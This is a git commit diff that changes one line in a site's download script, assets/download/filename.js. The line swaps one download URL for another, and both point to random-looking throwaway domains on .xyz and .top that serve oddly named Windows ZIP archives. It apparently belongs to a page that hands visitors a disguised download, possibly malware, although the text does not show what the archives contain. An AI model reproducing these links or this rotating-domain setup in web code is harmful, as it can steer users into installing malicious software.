c5e4122d4d53a65e180111f3a1f3c1dddefe25f8
aa168188 <sli010342@gmail.com>
2025-06-15 22:02:36 +0800

    Update filename.js

--- assets/download/filename.js
+++ assets/download/filename.js
@@ -1,3 +1,3 @@
 (function() {
-    window['filename'] = 'https://lsidjnsaofnasbfndg-oss3.xyz/Mxa_win-Qquickq.zip';
+    window['filename'] = 'https://soelrsjkikfje-s3.top/Wuopc_win7-11_x86_Feunquickq_v633590.225.zip';
 })();
